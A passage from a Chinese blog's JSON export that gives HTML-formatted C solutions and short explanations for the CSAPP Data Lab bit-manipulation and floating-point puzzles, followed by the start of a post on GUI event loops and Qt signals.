class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tmin</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>&lt;&lt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"fitBits\"><a href=\"#fitBits\" class=\"headerlink\" title=\"fitBits\"></a>fitBits</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * fitsBits - return 1 if x can be represented as an </span></span><br><span class=\"line\"><span class=\"comment\"> *  n-bit, two's complement integer.</span></span><br><span class=\"line\"><span class=\"comment\"> *   1 &lt;= n &lt;= 32</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 15</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitsBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !(x&gt;&gt;n+~<span class=\"number\">0</span>)|!((x&gt;&gt;n+~<span class=\"number\">0</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"comment\">//equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-5\"><a href=\"#思路-5\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。</li>\n</ul>\n<h3 id=\"divpwr2\"><a href=\"#divpwr2\" class=\"headerlink\" title=\"divpwr2\"></a>divpwr2</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class=\"line\"><span class=\"comment\"> *  Round toward zero</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 15</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">divpwr2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x+(t&amp;<span class=\"number\">1</span>&lt;&lt;n)+(~(t&amp;<span class=\"number\">1</span>)+<span class=\"number\">1</span>))&gt;&gt;n;</span><br><span class=\"line\">  <span class=\"comment\">//equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n;</span></span><br><span class=\"line\">  <span class=\"comment\">//note that &amp; 的优先级低于&lt;&lt;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-6\"><a href=\"#思路-6\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>直接移位是round down，无论是负数还是正数</li>\n<li>所以要实现round to zero , C表达式为<code>x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n</code></li>\n</ul>\n<h3 id=\"negate\"><a href=\"#negate\" class=\"headerlink\" title=\"negate\"></a>negate</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * negate - return -x </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: negate(1) = -1.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 5</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">negate</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~x+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-7\"><a href=\"#思路-7\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>直接取反再加1</li>\n</ul>\n<h3 id=\"isPositive\"><a href=\"#isPositive\" class=\"headerlink\" title=\"isPositive\"></a>isPositive</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: isPositive(-1) = 0.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 8</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isPositive</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~(x&gt;&gt;<span class=\"number\">31</span>)&amp;!!x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-8\"><a href=\"#思路-8\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>符号位判断，并且非0</li>\n</ul>\n<h3 id=\"isLessOrEqual\"><a href=\"#isLessOrEqual\" class=\"headerlink\" title=\"isLessOrEqual\"></a>isLessOrEqual</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 24</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isLessOrEqual</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !!(x&gt;&gt;<span class=\"number\">31</span>&amp;~(y&gt;&gt;<span class=\"number\">31</span>)) | !(~(x&gt;&gt;<span class=\"number\">31</span>)&amp;(y&gt;&gt;<span class=\"number\">31</span>))&amp;(x+~y+<span class=\"number\">1</span>&gt;&gt;<span class=\"number\">31</span>) | !(x^y);</span><br><span class=\"line\">\t<span class=\"comment\">//equal to  !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-9\"><a href=\"#思路-9\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><code>x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y</code></li>\n</ul>\n<h3 id=\"ilog2\"><a href=\"#ilog2\" class=\"headerlink\" title=\"ilog2\"></a>ilog2</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: ilog2(16) = 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 90</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">ilog2</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark1 = <span class=\"number\">0x55</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark2 = <span class=\"number\">0x33</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark3 = <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tx &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">1</span>&amp;mark1)+(x&amp;mark1);\t<span class=\"comment\">//every two bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">2</span>&amp;mark2)+(x&amp;mark2);\t<span class=\"comment\">//every four bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">4</span>&amp;mark3)+(x&amp;mark3);\t<span class=\"comment\">//every eight bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">8</span>)+x;\t<span class=\"comment\">//every 16 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">16</span>)+x;\t<span class=\"comment\">//every 32 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-10\"><a href=\"#思路-10\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>先构造从最高的1到最低位均为1的二进制，然后类似bitCount</li>\n</ul>\n<h3 id=\"float-neg\"><a href=\"#float-neg\" class=\"headerlink\" title=\"float_neg\"></a>float_neg</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class=\"line\"><span class=\"comment\"> *   floating point argument f.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   When argument is NaN, return argument.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 10</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_neg</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> uf)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = uf&amp;<span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(t^<span class=\"number\">0x7F800000</span> &amp;&amp; (t&gt;&gt;<span class=\"number\">23</span>)+<span class=\"number\">1</span>&gt;&gt;<span class=\"number\">8</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> </span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf^<span class=\"number\">0x80000000</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-11\"><a href=\"#思路-11\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>判别是否是NaN。先判断尾数是否全0，然后用<code>(t&gt;&gt;23)+1&gt;&gt;8</code>判断exp是否全1</li>\n</ul>\n<h3 id=\"float-i2f\"><a href=\"#float-i2f\" class=\"headerlink\" title=\"float_i2f\"></a>float_i2f</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class=\"line\"><span class=\"comment\"> *   Result is returned as unsigned int, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 30</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_i2f</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> shiftLeft=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> afterShift, tmp, flag;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> absX=x;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> sign=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//special case</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x==<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//if x &lt; 0, sign = 1000...,abs_x = -x</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sign=<span class=\"number\">0x80000000</span>;</span><br><span class=\"line\">        absX=-x;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    afterShift=absX;</span><br><span class=\"line\">    <span class=\"comment\">//count shift_left and after_shift</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tmp=afterShift;</span><br><span class=\"line\">        afterShift&lt;&lt;=<span class=\"number\">1</span>;</span><br><span class=\"line\">        shiftLeft++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tmp &amp; <span class=\"number\">0x80000000</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((afterShift &amp; <span class=\"number\">0x01ff</span>)&gt;<span class=\"number\">0x0100</span>)</span><br><span class=\"line\">        flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((afterShift &amp; <span class=\"number\">0x03ff</span>)==<span class=\"number\">0x0300</span>)</span><br><span class=\"line\">        flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        flag=<span class=\"number\">0</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> sign + (afterShift&gt;&gt;<span class=\"number\">9</span>) + ((<span class=\"number\">159</span>-shiftLeft)&lt;&lt;<span class=\"number\">23</span>) + flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//from http://www.cnblogs.com/tenlee/p/4951639.html</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-12\"><a href=\"#思路-12\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>分情况处理0、负数、正数</p>\n</li>\n<li><p>要处理舍人</p>\n<blockquote>\n<ul>\n<li>向接近的舍入</li>\n<li>如果处于中间，向偶数舍入</li>\n</ul>\n</blockquote>\n</li>\n<li><p>舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的</p>\n</li>\n</ul>\n<h3 id=\"float-twict\"><a href=\"#float-twict\" class=\"headerlink\" title=\"float_twict\"></a>float_twict</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class=\"line\"><span class=\"comment\"> *   floating point argument f.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   When argument is NaN, return argument</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 30</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_twice</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> uf)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = uf&amp;<span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> temp = t&amp;<span class=\"number\">0x7F800000</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> temp2 = uf&amp;<span class=\"number\">0xFF800000</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> expFull = !(temp^<span class=\"number\">0x7F800000</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(t^<span class=\"number\">0x7F800000</span> &amp;&amp; expFull)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(expFull)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> temp2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!(t&amp;<span class=\"number\">0x7F800000</span>))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">unsigned</span> k = (uf&amp;<span class=\"number\">0x7FFFFF</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> temp2+(k&lt;&lt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (temp&gt;&gt;<span class=\"number\">23</span>)+<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">23</span> | uf&amp;<span class=\"number\">0x807FFFFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-13\"><a href=\"#思路-13\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>分情况处理三种IEEE754的情况</li>\n<li>需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了</li>\n</ul>\n","slug":"CSAPP-Data-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"初学GUI的一些理解（瞎猜）","date":"2017-08-11T10:15:36.000Z","path":"2017/08/11/初学GUI的一些理解（瞎猜）/","text":"应该把整个程序运行过程分解为： 描述一个界面(前端) show出来 进入无限循环 在循环里按照刷新频率show这个界面 每次循环里还检测是否有输入，如果没有，就继续下一次循环 如果有，就像控制台程序一样，接受输入，给出输出 当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源) 也就是说，我把一个窗口程序分解为 定义图形 重复画图 对输入给出输出的类似控制台程序 在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端 进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数) 以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。 接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数) 如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来 但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数 如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数) 所谓发射出去，我猜测如下 GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次) 组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环) 把该消息放在共享的那块内存，然后每个组件都执行一次消息循环","raw":"---\ntitle: 初学GUI的一些理解（瞎猜）\ntoc:\ncomments: true\nmathjax: true\ndate: 2017-08-11 18:15:36\ntags:\n- GUI\n- Qt\ndescription:\ncategories:\n- 开发\n---\n- 应该把整个程序运行过程分解为：\n\n  1. 描述一个界面(前端)\n\n  - show出来\n  - 进入无限循环\n  - 在循环里按照刷新频率show这个界面\n  - 每次循环里还检测是否有输入，如果没有，就继续下一次循环\n  - 如果有，就像控制台程序一样，接受输入，给出输出\n  - 当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)\n\n- 也就是说，我把一个窗口程序分解为\n\n  1. 定义图形\n  2. 重复画图\n  3. 对输入给出输出的类似控制台程序\n\n\n- 